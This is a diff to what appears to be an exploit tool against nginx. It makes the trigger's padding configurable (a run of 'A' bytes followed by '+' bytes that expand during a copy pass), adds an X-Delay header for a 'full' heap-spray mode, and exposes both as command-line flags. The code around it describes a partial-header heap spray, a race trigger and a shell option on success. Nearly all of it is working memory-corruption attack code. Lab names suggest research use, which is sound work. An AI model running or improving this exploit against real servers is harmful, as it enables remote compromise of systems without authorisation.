@@ -2138,7 +2138,8 @@ def wait_alive(host: str, port: int, timeout: int = 30,
 
 
 def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
-            rewrite_path="/api", spray_path="/upload", spray_mode="partial"):
+            rewrite_path="/api", spray_path="/upload", spray_mode="partial",
+            pad_a=349, pad_plus=969):
     sprays = []
     # Incomplete-header heap spray: send request line + partial headers
     # without the terminating \r\n\r\n.  nginx stays in "reading headers"
@@ -2203,7 +2204,7 @@ def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
         return False
 
     path = rewrite_path.rstrip("/")
-    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
+    payload = "A" * pad_a + "+" * pad_plus + target_bytes.decode("latin-1")
     # Split-send the trigger: send request line + partial headers on 'a',
     # race with a concurrent GET on 'v', then complete 'a' headers.
     # Previously hardcoded to /api/ and used X-Delay:60 (custom module
@@ -2212,7 +2213,12 @@ def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
     _sleep(0.05)
     v.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
     _sleep(0.05)
-    a.sendall(b"Connection: close\r\n\r\n")
+    if spray_mode == "full":
+        # The DepthFirst PoC also delays the trigger at the backend, keeping
+        # the request context (and its corrupted pool) alive longer.
+        a.sendall(b"X-Delay: 60\r\nConnection: close\r\n\r\n")
+    else:
+        a.sendall(b"Connection: close\r\n\r\n")
     _sleep(0.2)
     v.close()
     _sleep(0.1)
@@ -2773,6 +2779,12 @@ Usage examples
     tu.add_argument("--spray-mode", choices=["partial", "full"], default="partial",
                     help="partial: short body + large Content-Length (bundled lab); "
                          "full: complete body + X-Delay (DepthFirst lab)")
+    tu.add_argument("--pad-a", type=int, default=349, metavar="N",
+                    help="count of non-expanding bytes before the '+'-run in the "
+                         "trigger path (default: 349, DepthFirst lab)")
+    tu.add_argument("--pad-plus", type=int, default=969, metavar="N",
+                    help="count of '+' bytes in the trigger path; each expands "
+                         "1→3 during the copy pass (default: 969)")
     tu.add_argument("--build", metavar="KEY",
                     help="pre-computed build profile. known keys: "
                          + (", ".join(k for k in KNOWN_BUILDS if k != "_default") or "none"))
@@ -3021,7 +3033,8 @@ Usage examples
                                    args.spray, args.body_len, use_tls, args.proxy,
                                    rewrite_path=args.rewrite_path,
                                    spray_path=args.spray_path,
-                                   spray_mode=args.spray_mode):
+                                   spray_mode=args.spray_mode,
+                                   pad_a=args.pad_a, pad_plus=args.pad_plus):
                             winner_try = an + 1
                             if args.shell:
                                 success     = True
